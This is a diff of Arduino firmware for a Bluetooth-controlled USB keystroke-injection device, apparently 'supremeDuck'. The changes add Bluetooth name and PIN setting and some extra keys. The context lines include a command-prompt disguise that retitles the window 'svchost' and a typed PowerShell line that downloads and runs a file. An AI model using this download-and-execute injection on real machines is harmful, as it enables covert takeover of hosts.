@@ -30,13 +30,13 @@ Created by Michal Borowski
   #define myKeyboard Keyboard                     // custom variable so it's easy to switch between "BootKeyboard" by NicoHood (https://github.com/NicoHood/HID/tree/master/examples/Keyboard/BootKeyboard) and the normal keyboard
 #endif
 
-#define Version "1.04"                            // it is used to compare it with the app version to make sure that both of them are the same (if they're not the same it will be shown in the mobile app and update will be suggested, first implemented in version 1.03 so it won't give any notice for earlier versions)
+#define Version "1.05"                            // it is used to compare it with the app version to make sure that both of them are the same (if they're not the same it will be shown in the mobile app and update will be suggested, first implemented in version 1.03 so it won't give any notice for earlier versions)
 #include <SoftwareSerial.h>                       // Allows com.munication between the Arduino and HC-06 module.
 #include <EEPROM.h>                               // Electrically Erasable Programmable Read-Only Memory, it allows to save some values that will prevail even when the device is disconnected from power.
                                                   // ATMEGA 32U4 which is the chip on Arduino Pro Micro has 1024 bytes of EEPROM.
-
+#define DEBUG_MODE false                          // does not execute the code till serial monitor is opened
 #define LOG_SAVED_ENCODING_EEPROM false
-#define LOG_SERIAL false                          //setting to true makes mouse movement laggy if the serial monitor isn't open
+#define LOG_SERIAL false                         //setting to true makes mouse movement laggy if the serial monitor isn't open
 
 #define HC_BAUDRATE 9600                          //(default baud rate of hc-06) It's the speed of communication between Arduino and HC-06, it shouldn't be changed without additionally changing it on the HC-06.
 
@@ -44,11 +44,7 @@ Created by Michal Borowski
 #define EEPROM_ADDRESS_TRIGGER_TRICK 0
 trick = plug it in + plug out within 3 secs => special function is triggered(that special function is commented out in "setup" funciton)
 */
-
-                                                  //To do: add comma check in app or solve the bug (if data received by arduino ends with ",,end" instead of standard ",end" arduino won't respond anymore)
-
-                                                  //https://www.arduino.cc/en/Reference/KeyboardModifiers
-
+                                                  
 //SoftwareSerial BTSerial(16, 15);                // it could also work
 SoftwareSerial BTSerial(9, 8);                    // RX | TX these are pins responsible for communication between the bluetooth module and arduino
 //SoftwareSerial BTSerial(8, 9);                  // old pinout (less comfortable to solder, now only 1 of these devices has it this way)
@@ -67,6 +63,28 @@ byte Encoding[3][ENCODING_SIZE] = {               //definition only applies to n
   {0x81, 0x81, 0x81, 0x81, 0x81, 0x81, 0x00, 0x81, 0x81, 0x81, 0x81, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x81, 0x00, 0x81, 0x00, 0x81, 0x81, 0x81, 0x81, 0x81, 0x81, 0x81, 0x81, 0x81, 0x00, 0x00, 0x00, 0x81, 0x81, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x81, 0x81, 0x81, 0x81}
 }; //saved at EEPROM 1-100, 101-200, 201-300
 
+
+/*
+  How this project is using EEPROM space:
+  0 - tricky activation for classic rubber ducky plug and execute method (deactivated/commented out, can't be bool, has to be some predefined int that normally would be unlikely to be there)
+  1-300 - encoding
+  301 - use multilang
+  302-332 - encoding name
+  333-363 - bluetooth name
+  364-369 - bluetooth pin
+
+  1008 - requested name change (after reboot, can't be bool, has to be some random pre-defined int)
+  1012 - requested pin change
+ */
+
+
+
+#define EEPROM_ADDRESS_REQUESTED_BLUETOOTH_NAME_CHANGE 1008
+#define EEPROM_ADDRESS_REQUESTED_BLUETOOTH_PIN_CHANGE 1012
+#define EEPROM_ADDRESS_BLUETOOTH_NAME 333
+#define BLUETOOTH_NAME_SIZE 30
+#define EEPROM_ADDRESS_BLUETOOTH_PIN 364
+
 #define EEPROM_ADDRESS_ENCODING_AVAILABLE 1016                  // address at which "777" will be written when the device will receive its first instruction to use some other encoding than the default US (this way I'll know to load EEPROM instead of using default US after re-boot)
 #define EEPROM_STARTING_ADDRESS_ENCODING_DESIRED 1 
 #define EEPROM_STARTING_ADDRESS_ENCODING_USED 101
@@ -74,6 +92,10 @@ byte Encoding[3][ENCODING_SIZE] = {               //definition only applies to n
 bool useMultiLangWindowsMethod = true;                          // it's set to true but it will be reset after checking EEPROM which is done after turning on the device
 #define EEPROM_ADDRESS_USE_MULTI_LANG_METHOD_WINDOWS 301
 #define EEPROM_STARTING_ADDRESS_ENCODING_NAME 302
+#define ENCODING_NAME_SIZE 30
+
+
+
 
 /*
  * keypad values copied from http://forum.arduino.cc/index.php?topic=266688.msg1880647#msg1880647
@@ -84,7 +106,7 @@ byte KEYPAD[10] = {234, 225, 226, 227, 228, 229, 230, 231, 232, 233};
 
 unsigned long previousSendingTime = 0;                    // used for sending setting data updates to the phone (current keyboard encoding, multilang thing)
 unsigned long lastOKsendingTime = 0;
-char encodingName[30] = {"US"};                           // it will store the name of the currently used language encoding so it can be sent and displayed on the application (e.g  US, UK - gb, Deutch - ger, etc.)
+char encodingName[ENCODING_NAME_SIZE] = {"US"};                           // it will store the name of the currently used language encoding so it can be sent and displayed on the application (e.g  US, UK - gb, Deutch - ger, etc.)
 
 char commandLineObfuscationString[54] = "echo off & mode 20,1 & title svchost & color 78 & cls";                      // line used to make the command prompt less visible
 
@@ -102,6 +124,13 @@ void setup()                                    // setup function is a part of e
 
   Serial.begin(9600);                           // begin serial communication so it's possible to use "Tools -> Serial Monitor" to see the debugging output
 
+  if(DEBUG_MODE){
+    while(!Serial){
+      ;
+    }
+  }
+  
+  
   /*
   //TRIGGER TRICK
   //plug in and out within 3 sec to trigger some action at the next plug in
@@ -123,6 +152,7 @@ void setup()                                    // setup function is a part of e
   SavedEncodingAvailabilityCheck();             //rewrites the default US encoding with the saved one
   SavedMultiLangMethodWindowsCheck();           //checks whether to use the alt+numpad method
 
+  ChangeBluetoothCheck();
   
   //delay(5000);
 
@@ -170,7 +200,7 @@ void loop()                                   // loop function is also a part of
       }    
     }
 
-    inSerial[i]='\0';                                   // end the string with 0
+    inSerial[i]= 0;                                     // end the string with 0
     if(LOG_SERIAL){Serial.write(inSerial);}             //it's useful for checking what text arduino receives from android but it makes the mouse movement laggy if the serial monitor is closed
     Serial.write("\n");                                 // new line, btw "F()" function helps with memory management, instead of being saved in dynamic memory it gets saved in the larger storage
     Check_Protocol(inSerial);                           // main checking function, all the functionality gets triggered there depending on what it received from the bluetooth module      
@@ -209,21 +239,21 @@ void SavedMultiLangMethodWindowsCheck()                   // check whether the M
   EEPROM.get(EEPROM_ADDRESS_USE_MULTI_LANG_METHOD_WINDOWS, useMultiLangWindowsMethod);                //read from EEPROM (persistent memory of ATMEGA 32U4) to see whether it should use MultiLang method
   if(LOG_SERIAL)
   { 
-    Serial.print(F("MultiLang method (Windows only) setting has been read from the EEPROM - "));
+    Serial.print("MultiLang method (Windows only) setting has been read from the EEPROM - ");
     if(useMultiLangWindowsMethod)
     {
-      Serial.println(F("it's enabled."));
+      Serial.println("it's enabled.");
     }
     else
     {
-      Serial.println(F("it's disabled."));
+      Serial.println("it's disabled.");
     }
   }
 }
 
 void SavedEncodingAvailabilityCheck()                               //rewrites the default US encoding with the one which was used last time and saved to EEPROM
 {
-  int numCheck;                                                     //this has to be changed to int and saved elsewhere in the EEPROM, it has to be certain value so it won't give false positives
+  int numCheck = 0;                                                     //this has to be changed to int and saved elsewhere in the EEPROM, it has to be certain value so it won't give false positives
   EEPROM.get(EEPROM_ADDRESS_ENCODING_AVAILABLE, numCheck);
   if(numCheck == 777)
   {
@@ -235,7 +265,7 @@ void SavedEncodingAvailabilityCheck()                               //rewrites t
         if(LOG_SAVED_ENCODING_EEPROM)
         {
           Serial.print(Encoding[i][offset], HEX);
-          Serial.print(F(","));
+          Serial.print(",");
         }
       }
 
@@ -246,8 +276,59 @@ void SavedEncodingAvailabilityCheck()                               //rewrites t
   }
   else if(LOG_SAVED_ENCODING_EEPROM)
   {
-    Serial.print(F("No encoding available"));
-    Serial.print(F("\n"));
+    Serial.print("No encoding available");
+    Serial.print("\n");
+  }
+}
+
+void ChangeBluetoothCheck(){
+  int numCheck = 0;
+
+  
+  EEPROM.get(EEPROM_ADDRESS_REQUESTED_BLUETOOTH_NAME_CHANGE, numCheck);
+  if(numCheck == 777)
+  {
+    EEPROM.put(EEPROM_ADDRESS_REQUESTED_BLUETOOTH_NAME_CHANGE, 0);
+    char bluetoothName[BLUETOOTH_NAME_SIZE] = {0};
+    //Serial.println(bluetoothName);
+    EEPROM.get(EEPROM_ADDRESS_BLUETOOTH_NAME, bluetoothName);
+    char at_cmd[BLUETOOTH_NAME_SIZE + 15] = {0};
+    sprintf(at_cmd, "AT+NAME%s\0", bluetoothName);
+    delay(700);
+    
+    BTSerial.print(at_cmd);
+    
+    if(LOG_SERIAL){
+      Serial.println("Changed bluetooth name. Command used:");
+      Serial.println(at_cmd);
+    }
+    
+    delay(1000);
+    while(BTSerial.available() > 0){char c = BTSerial.read();}
+  }
+
+  numCheck = 0;
+  
+  EEPROM.get(EEPROM_ADDRESS_REQUESTED_BLUETOOTH_PIN_CHANGE, numCheck);
+  if(numCheck == 777)
+  {
+    EEPROM.put(EEPROM_ADDRESS_REQUESTED_BLUETOOTH_PIN_CHANGE, (int)0);
+    char pin[5] = {0};
+    EEPROM.get(EEPROM_ADDRESS_BLUETOOTH_PIN, pin);
+    char at_pin_cmd[16] = {0};
+    sprintf(at_pin_cmd, "AT+PIN%s\0", pin);
+    delay(700);
+    BTSerial.print(at_pin_cmd);
+
+    if(LOG_SERIAL){
+      Serial.println("Changed bluetooth pin. Command used:");
+      Serial.println(at_pin_cmd);
+    }
+
+    //Serial.println("wtf");
+    
+    delay(1000);
+    while(BTSerial.available() > 0){char c = BTSerial.read();}
   }
 }
 
@@ -310,6 +391,41 @@ void EnterCommand(char *text)
 
 void Check_Protocol(char *inStr)
 {       
+    if(!strcmp(inStr, "Ctrl_alt_del\0")){
+      myKeyboard.releaseAll();
+      delay(20);
+      myKeyboard.press(KEY_LEFT_CTRL);
+      delay(20);
+      myKeyboard.press(KEY_LEFT_ALT);
+      delay(20);
+      myKeyboard.press(KEY_DELETE);
+      delay(200);
+      myKeyboard.releaseAll();
+    }
+
+    if(!strcmp(inStr, "Right_click\0")){
+      Mouse.click(MOUSE_RIGHT);
+    }
+
+    if(!strcmp(inStr, "Esc\0")){
+      myKeyboard.press(KEY_ESC);
+      delay(20);
+      myKeyboard.releaseAll();
+      
+    }
+    
+    if(!strcmp(inStr, "Backspace\0")){
+      myKeyboard.press(KEY_BACKSPACE);
+      delay(20);
+      myKeyboard.releaseAll();
+    }
+
+  
+    if(!strcmp(inStr, "Disconnect\0")){
+      delay(1000); 
+      ChangeBluetoothCheck();
+    }
+    
     if(!strcmp(inStr, "Enter\0")){typeKey(KEY_RETURN);}
     
     if(!strcmp(inStr, "Alt+F4\0")){
@@ -461,12 +577,12 @@ void Check_Protocol(char *inStr)
         if(!strcmp(inStr,"Enabled")){
           useMultiLangWindowsMethod = true;
           EEPROM.put(EEPROM_ADDRESS_USE_MULTI_LANG_METHOD_WINDOWS, true);
-          if(LOG_SERIAL){Serial.println(F("MultiLang method (Windows only) has been enabled."));}
+          if(LOG_SERIAL){Serial.println("MultiLang method (Windows only) has been enabled.");}
         }
         else if(!strcmp(inStr,"Disabled")){
           useMultiLangWindowsMethod = false;
           EEPROM.put(EEPROM_ADDRESS_USE_MULTI_LANG_METHOD_WINDOWS, false);
-          if(LOG_SERIAL){Serial.println(F("MultiLang method (Windows only) has been disabled."));}
+          if(LOG_SERIAL){Serial.println("MultiLang method (Windows only) has been disabled.");}
         }
     }
       
@@ -569,7 +685,26 @@ void Check_Protocol(char *inStr)
         Print("'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;\" & exit");
         typeKey(KEY_RETURN);
   }
-  
+
+
+  if(IsCmd(inStr, "CBN:")){                     //CBN:supremeDuck,end (change bluetooth name, after next reboot)
+      ExtractDeliveredText(inStr, 4);
+      char bluetoothName[BLUETOOTH_NAME_SIZE] = {0};
+      sprintf(bluetoothName, "%s\0", inStr);
+      
+      EEPROM.put(EEPROM_ADDRESS_BLUETOOTH_NAME, bluetoothName); 
+      EEPROM.put(EEPROM_ADDRESS_REQUESTED_BLUETOOTH_NAME_CHANGE, 777);   
+  }
+
+  if(IsCmd(inStr, "CBP:")){                     //CBP:3737,end (change bluetooth pin, after next reboot)
+      ExtractDeliveredText(inStr, 4);
+      char pin[5] = {0};
+      sprintf(pin, "%s\0", inStr);
+      
+      EEPROM.put(EEPROM_ADDRESS_BLUETOOTH_PIN, pin); 
+      EEPROM.put(EEPROM_ADDRESS_REQUESTED_BLUETOOTH_PIN_CHANGE, 777);   
+  }
+    
   memset(inStr, 0, MAX_SERIAL_LENGTH);
 }
 
@@ -602,6 +737,8 @@ int SubStrIndex(char *str, char *sfind)
   }
   return 0;
 }
+
+
 
 bool IsCmd(char *str, char *cmdStart){
   return (StrStartsWith(str, cmdStart) && StrEndsWith(str, ",end"));
@@ -814,7 +951,7 @@ void SetNewCharEncoding(char *inStr){
       break;
     default:
       {
-        Serial.print(F("Error: Incorrect encoding factor."));
+        Serial.print("Error: Incorrect encoding factor.");
         return;
       }
       break;
@@ -833,13 +970,13 @@ void SetNewCharEncoding(char *inStr){
     if(LOG_SAVED_ENCODING_EEPROM)
     {
       Serial.print(Encoding[encodingFactor][offset/2], HEX);
-      Serial.print(F("-"));
+      Serial.print("-");
       Serial.print(offset);
-      Serial.print(F("  "));       
+      Serial.print("  ");       
     }
   }  
   
-  if(LOG_SAVED_ENCODING_EEPROM){Serial.print(F("\nSaved to EEPROM:\n"));}
+  if(LOG_SAVED_ENCODING_EEPROM){Serial.print("\nSaved to EEPROM:\n");}
 
   //save to EEPROM
   for(byte offset=0; offset<ENCODING_SIZE; offset++)
@@ -850,11 +987,10 @@ void SetNewCharEncoding(char *inStr){
     if(LOG_SAVED_ENCODING_EEPROM)
     {
       Serial.print(Encoding[encodingFactor][offset], HEX);
-      Serial.print(F(","));
+      Serial.print(",");
     }
   }
-  if(LOG_SAVED_ENCODING_EEPROM){Serial.print(F("\n\n"));}
+  if(LOG_SAVED_ENCODING_EEPROM){Serial.print("\n\n");}
 }
-
 
 
